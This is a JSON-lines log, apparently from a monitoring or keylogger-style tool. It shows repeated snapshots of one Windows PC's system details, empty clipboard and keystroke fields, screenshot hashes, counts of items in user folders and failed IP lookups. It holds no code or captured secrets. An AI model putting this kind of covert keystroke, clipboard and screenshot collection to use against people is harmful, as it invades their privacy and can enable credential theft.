{"timestamp": "2025-06-14T06:43:18.470391+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "357c1c11508f509a8efb9a6bf9d4a4879af4605bf365d8ed2debc3f06af363bf", "_raw_log_hash": "2e91a507c3471cff595f0c5c059e624d96886cc3c70233ca56f7e13b3c7dbbcb"}
{"timestamp": "2025-06-14T06:43:31.931577+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ae135363645545f6f89c9f7192333856033093ee9de5220e48b6c7394518c9f9", "_raw_log_hash": "eee39deeca3d47d579c69125fedac773572ab1e483506fe053cef348e7016fa4"}
{"timestamp": "2025-06-14T06:43:45.448151+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bceef2a2ca8f1f13ed408694737d5269f2f19dd5a171376bfb52b011b7f209d1", "_raw_log_hash": "f8c5e674b7e0206a5f1c6a006f30aeb999b37c33dfd5403c390c3ec95e35cd96"}
{"timestamp": "2025-06-14T06:43:58.925952+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3a957b1afb8fbed125b4f34abf754eda64b8fd38e7e9322aa1412bb437249af5", "_raw_log_hash": "3f2be0ba9caa6a1e940bc6d0d7c05eab55e4693145f04188b8f7ab468b0dc2e7"}
{"timestamp": "2025-06-14T06:44:12.398498+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "592fca65d171cb80eadd7860866d28982d9aaffd6fac2f84d2cfceed30bfde5e", "_raw_log_hash": "a1099291efca47facc2e5460d903d8363adaafb5d46d8475432bcf9cff35a5ec"}
{"timestamp": "2025-06-14T06:44:25.876506+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "035d06e7fa2cef6b40a9a5cbbdd44075eaa6e87abeb1e02569297eb85ddf13df", "_raw_log_hash": "6005548c1360a29e79d36e688ea0ef77904eabeb350402efc26296c599616799"}
{"timestamp": "2025-06-14T06:44:39.454574+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "df62ae22ae9b9f57a912c487e5eb7be8f641076f8d8447c7484d9d38167ff3e9", "_raw_log_hash": "5ba846226a6bc0c509ca716f9e7a2c13a0b2766288e55dc0a26cef07bb1a8f71"}
{"timestamp": "2025-06-14T06:44:52.911710+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "628bfc7324971b53637e2e761008db921b6112b168d4091d38122ccdea4310e2", "_raw_log_hash": "a0faadbaaab3d755112cfd77d6841f75c444657e09d609efb705f8d90f6badcb"}
{"timestamp": "2025-06-14T06:45:06.462767+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "64f3129e54546c4acce82146b4c43e89efe1dc9f8b8fb26065375ca0fd5536f5", "_raw_log_hash": "f5dfccc608b89b58f06b1c6490037906829d4eadbe42864674112eebb0e0be81"}
{"timestamp": "2025-06-14T06:45:20.097687+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fc3f528f3762dc5dba0c5628d7befa595a11dd03c3f438b6c22fbc70b0fa1a3b", "_raw_log_hash": "0353f1bb998e904efccbc097b1b724186492d7f60672cf896d5b7cabfb38acc6"}
{"timestamp": "2025-06-14T06:45:33.669181+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C690>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4306e46a36e2a2218d5f782132fc6ca41ed1a6b80ce32c10572d82dd77148565", "_raw_log_hash": "2ec1319479740ffa70b1c91482f9d8b0b2358f4a67bd93fb3e7a8a18748c188a"}
{"timestamp": "2025-06-14T06:45:47.195850+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8c19e299edadc3556b7c1a7471f4c18e5349e35831190c0e642b1a2f70e93fd5", "_raw_log_hash": "8f236fb64a15545d53305f81ea31b9a95dc3e92793bd90ad874b13086818ee70"}
{"timestamp": "2025-06-14T06:46:00.729830+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d7913cbb73825f1137d0390ce46d4564a11f55b685026738ba66ef6c4551ac33", "_raw_log_hash": "6be7d483a454b6237a7133e813968cdfaf5119cb657046a0699a222006e0fa51"}
{"timestamp": "2025-06-14T06:46:14.404177+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CB90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7c439368f15bd357bcac3a3a61984253a2401c93959d33afda1d72c4a072dd3d", "_raw_log_hash": "54ab39cf9a51868bc86ea9128b23603901fca86654173266ad6b93e03d029122"}
{"timestamp": "2025-06-14T06:46:27.848536+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "0344f98b8b69d8c6c36c835517c3cf155008ddaf44d9b456e536c6a015ed1252", "_raw_log_hash": "8077c2d77b4ffe321b0eff2abde16e7c24456bf6033aa02ab74684412f9a7bbf"}
{"timestamp": "2025-06-14T06:46:41.427582+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "566b7703875eb55dd63b60f2e635fc15bf0a54323f5fc921f50a1fef8862fb6c", "_raw_log_hash": "ef92a4202af9d8f3c48bda15e5d395c76211fcbd1146164b5244d0dda506b975"}
{"timestamp": "2025-06-14T06:46:54.868416+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CE10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7b5fee7efd4b8d55817f8cb0899cc085a2ec5fd9ef49039b3324903ff2645404", "_raw_log_hash": "548fad17a09dd011c82a98af595b5be9f9c264bd41be3f3d3a5a4fadf1eef663"}
{"timestamp": "2025-06-14T06:47:08.364153+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e38de982e356b6eb7ef2e7c6004985f0564e39f0c8e1df074af65e2c74328562", "_raw_log_hash": "07594bbe8840c2aad622d412b7f49e203050e7515e1b48f26c76a3ff11241fc0"}
{"timestamp": "2025-06-14T06:47:21.822563+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c326c6c74de265d310240e6524f21bb4ae841ed577ce279106435bfd574a16b3", "_raw_log_hash": "384ed23f274af8f185bd99ffc4902843c2d851c9aaa4283dd116e06eb45525e9"}
{"timestamp": "2025-06-14T06:47:35.304867+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33C910>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fb019f27e3f72e449b67e7b2ceff2ea73cefedf079410888fd99cb7720380155", "_raw_log_hash": "9c6bd819dd1df6e19f750b8b9c515b5d8f77b6b10776fc03a6ed2d9db66d911d"}
{"timestamp": "2025-06-14T06:47:48.801733+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4746e6e049d864028b7332a28a6c492a3200a9225d4050583452a4497fad9567", "_raw_log_hash": "46701b624385c84f5e984960e8cf60bd89e2edeb5d38421843994d47251a0492"}
{"timestamp": "2025-06-14T06:48:02.387053+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "f2b696d1c02e1b0a18b38b2b946b9a49dfd6b6a86b7cf897213d2fffc07c8200", "_raw_log_hash": "43bb23b475f38a2bfd36fa0149f1ed9d872f68d9752c92cb44fe52cb196a682e"}
{"timestamp": "2025-06-14T06:48:15.917515+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "de4ca318f289d196c903a31d061543c8d2c902dc4f0ef701dba4a2ac23694186", "_raw_log_hash": "0ae3c662cc55c5e94228c5c9813b737eca6b27f869355f6108866525179cd7a3"}
{"timestamp": "2025-06-14T06:48:29.450211+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ec27490e9e9753c33f87de0289daabf06b0ff81ddee57088d5e943d831c093ee", "_raw_log_hash": "e4f84f6e666240e9b446ad09c570d9e280aebb71fea55b30cc36ea9268c1f971"}
{"timestamp": "2025-06-14T06:48:42.953271+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5a3560fea3d52f76f6a66622aaf8e16d09b70c6d89126ffd06362e86d3d97327", "_raw_log_hash": "803c2ccb04b6abbbd398b2ef1649fedda38da8db5a35597c701a2df47389b029"}
{"timestamp": "2025-06-14T06:48:56.418890+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F250>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b19e6fb391bc691928c81112080d595e370a87a014f1f7cac7befcfa168567aa", "_raw_log_hash": "41cdc934f9d67fca9b4e1948ed6b723cb6e50d9620a812306cd73b35904b48a0"}
